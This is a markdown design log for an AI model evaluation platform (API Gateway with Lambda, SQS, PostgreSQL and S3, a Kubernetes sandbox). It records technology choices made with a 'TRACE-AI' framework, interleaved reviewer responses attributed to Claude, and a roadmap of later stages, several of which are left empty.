- **SQS**: Managed AWS service, simpler but less control
- **Kinesis**: Better for streaming data than task management
- Key question: Do we need complex task dependencies or just simple job queuing?

### Monitoring Layer
Redis for fast retrieval is smart! Also consider:
- Time-series data storage (metrics over time)
- How much history to keep
- Push vs pull for real-time updates (remember our SSE discussion)

### Storage Layer
Good breakdown of storage types! For our requirements:
- **S3 for artifacts**: ✓ Scalable, cheap for large files
- **PostgreSQL**: Good for relational data (evaluation metadata, user info)
- **Document DB**: Maybe overkill unless evaluations have very varied schemas
- Consider: Start with Postgres + S3, add document DB if needed?

### Task Evaluator (Kubernetes)
Great security point! Additional criteria for evaluation:
- **Resource isolation**: CPU/memory limits per evaluation
- **Network policies**: Preventing escape attempts
- **Ephemeral storage**: Nothing persists between evaluations
- **Multi-tenancy**: Safe resource sharing between researchers

### Web Frontend
For Next.js/React/TypeScript, consider how it serves our requirements:
- **Req #2 (Monitoring)**: Need real-time updates (SSE/WebSocket client)
- **Req #4 (UI)**: Researcher-friendly dashboard
- Additional: Authentication, responsive design, accessibility

**Missing component?** Where does authentication/authorization fit? It touches multiple components but might deserve its own consideration.

Your v1 shows good engineering thinking - acknowledging unknowns and mapping choices to requirements!

## v2: Applying TRACE-AI Framework

For each component, we'll apply TRACE-AI to guide our technology selection:

### API

**TRACE-AI Analysis:**
- **T (Time to feedback)**: Need working API quickly → Simple wins
- **R (Reversibility)**: API implementation is medium cost to change → Can start simple
- **A (Abstraction)**: Can hide behind interface → ✓ Good candidate for simple start
- **C (Core vs Peripheral)**: API is infrastructure, not core value → Simple is fine
- **E (Expertise)**: Team knows Lambda → Can use it effectively
- **F (AI Fungibility)**: High - AI can easily migrate between API frameworks → Start simple

**Decision**: API Gateway + Lambda for MVP
- Supports simple request/response pattern
- Minimal infrastructure to manage
- Can evolve to FastAPI later if needed

### Queue

**TRACE-AI Analysis:**
- **T**: Need async processing working → Managed service faster
- **R**: Queue technology is reversible with abstraction → ✓
- **A**: Easy to abstract queue interface → ✓
- **C**: Infrastructure, not core → Simple is fine
- **E**: SQS requires less expertise than Celery → ✓
- **F**: Very high - AI can migrate queue code easily → SQS

**Decision**: AWS SQS
- Zero infrastructure overhead
- Built-in durability and DLQ
- Can migrate to Celery when complexity demands

### Web Frontend

**TRACE-AI Analysis:**
- **T**: Researchers need UI to submit evals → Important for feedback
- **R**: Frontend frameworks have migration cost → Medium
- **A**: Less abstraction possible in UI → Consider carefully
- **C**: User-facing, affects researcher experience → More important
- **E**: React/TypeScript is industry standard → Good expertise availability
- **F**: Medium - AI helps but UI migrations are still work → Standard choice OK

**Decision**: React + TypeScript
- Industry standard, good for hiring
- Rich ecosystem for dashboards
- Type safety helps with API integration

### Storage Layer

**TRACE-AI Analysis:**
- **T**: Need to store results quickly → Simple solution fine
- **R**: Data migration is expensive → ⚠️ Think carefully
- **A**: Can abstract storage interface → ✓
- **C**: Results storage is important but not differentiating → Standard solutions
- **E**: PostgreSQL + S3 well understood → ✓
- **F**: Low for data, high for code → Design schema carefully

**Decision**: PostgreSQL + S3
- PostgreSQL for structured data (metadata, status)
- S3 for artifacts (logs, outputs)
- Clear separation of concerns

### Task Evaluator (Kubernetes)

**TRACE-AI Analysis:**
- **T**: Core safety feature, but can start simple → Iterate carefully
- **R**: Security architecture hard to change → ⚠️ Important decision
- **A**: Can abstract orchestration layer → ✓
- **C**: **This IS core** - Safety isolation is key value → Invest time here
- **E**: Kubernetes is complex → Start simple, evolve
- **F**: Low - Security design not easily automated → Think it through

**Decision**: Kubernetes with progressive hardening
- Start with basic pods and resource limits
- Add network policies, gVisor, etc. progressively
- Document security evolution clearly

### Overall v2 Insights

Applying TRACE-AI revealed:
1. **Queue/API/Storage** → High fungibility, start simple
2. **Frontend** → Medium fungibility, use standards
3. **Kubernetes/Security** → Low fungibility, design carefully

This aligns with extreme MVP: start with `extreme_mvp.py`, but think carefully about the security model from the beginning.

## Claude's Response to v2

Your v2 API decision is well-reasoned! Here's a slightly refined version that makes the rationale even clearer:

### API (Refined)
After discussing usage patterns with stakeholders, we selected API Gateway + Lambda because:
- Supports simple request/response pattern (validate → enqueue → return ID)
- Handles essential safety checking on Python scripts
- Scales automatically with demand
- No server management overhead for MVP

Note: Python scripts are the only submission type for MVP. For detailed analysis of alternatives and future migration paths, see /docs/api-design-considerations.md and /docs/real-time-updates-comparison.md

### Web Frontend

# Level 5: MVP
## Process

Begin by using terraform to provision architecture.
## Production Artifact
API
Monitoring Layer
Task Evaluator
Storage Layer
## Claude's Response

# Level 6: Core Evaluation Engine
## Process
Implementing the worker that processes evaluation tasks and orchestrates Kubernetes pods for safe model evaluation.

## Production Artifact
Inclusion of helm (Claude's advice)

## Claude's Response

# Level 7: External Integrations & Researcher Experience
## Process
Adding quality-of-life features that researchers actually want - notifications, data export, and workflow integrations.

## Production Artifact
Nice-to-have components that make the platform more usable:
- Slack notifications for evaluation events
- Airtable integration for results management
- Email notifications (for those who prefer it)
- Webhook framework for custom integrations

## Claude's Response

# Level 8: Monitoring & Observability Dashboard
## Process
Building comprehensive visibility into system health, evaluation progress, and resource usage.

## Production Artifact

## Claude's Response

# Level 9: Security Hardening & Compliance
## Process
Implementing defense-in-depth security measures and audit trails for compliance requirements.

## Production Artifact

## Claude's Response

# Level 10: Enterprise Features & Multi-tenancy
## Process
Adding features for organizational use: SSO, team management, resource quotas, and isolated environments per team.

## Production Artifact

## Claude's Response